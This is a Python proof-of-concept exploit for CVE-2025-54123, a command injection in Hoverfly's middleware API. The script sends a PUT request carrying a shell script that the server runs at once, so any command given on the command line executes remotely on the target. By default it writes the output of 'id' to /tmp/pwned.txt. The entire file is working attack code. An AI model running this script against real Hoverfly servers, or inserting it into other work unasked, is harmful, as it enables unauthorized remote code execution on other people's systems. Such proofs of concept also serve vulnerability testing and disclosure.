#!/usr/bin/env python3
import requests
import sys
import argparse


def exploit(target_url, command):
    """
    CVE-2025-54123: Hoverfly Command Injection via Middleware API
    
    The vulnerability exists in /api/v2/hoverfly/middleware endpoint.
    When setting middleware with binary and script, Hoverfly immediately
    executes the script to test it without proper validation.
    """
    
    middleware_url = f"{target_url}/api/v2/hoverfly/middleware"
    
    script_content = f"""#!/bin/sh
{command}
cat << 'EOF'
{{"request":{{"path":"/","method":"GET","destination":"www.test.com","scheme":"","query":"","body":"","headers":{{"test_header":["true"]}}}},"response":{{"status":200,"body":"ok","encodedBody":false,"headers":{{"test_header":["true"]}}}}}}
EOF
"""
    
    payload = {
        "binary": "/bin/sh",
        "script": script_content,
        "remote": ""
    }
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Sending payload to {middleware_url}")
    print(f"[*] Command: {command}")
    
    try:
        response = requests.put(
            middleware_url,
            json=payload,
            headers={"Content-Type": "application/json"},
            timeout=10
        )
        
        print(f"[*] Response Status: {response.status_code}")
        print(f"[*] Response Body: {response.text}")
        
        if response.status_code == 200:
            print("[+] Exploit successful! Command was executed on the target.")
            return True
        else:
            print("[-] Exploit may have failed. Check the response.")
            return False
            
    except requests.exceptions.Timeout:
        print("[!] Request timed out. Command might still have executed.")
        return True
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        return False


def check_version(target_url):
    """Check Hoverfly version"""
    try:
        response = requests.get(f"{target_url}/api/v2/hoverfly/version", timeout=5)
        if response.status_code == 200:
            version = response.json().get("version", "unknown")
            print(f"[*] Hoverfly Version: {version}")
            return version
    except:
        print("[-] Failed to get version")
    return None


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2025-54123: Hoverfly Command Injection PoC"
    )
    parser.add_argument(
        "-t", "--target",
        default="http://127.0.0.1:8888",
        help="Target URL (default: http://127.0.0.1:8888)"
    )
    parser.add_argument(
        "-c", "--command",
        default="id > /tmp/pwned.txt",
        help="Command to execute (default: id > /tmp/pwned.txt)"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("CVE-2025-54123: Hoverfly Command Injection Exploit")
    print("=" * 60)
    
    version = check_version(args.target)
    
    if exploit(args.target, args.command):
        sys.exit(0)
    else:
        sys.exit(1)


if __name__ == "__main__":
    main()
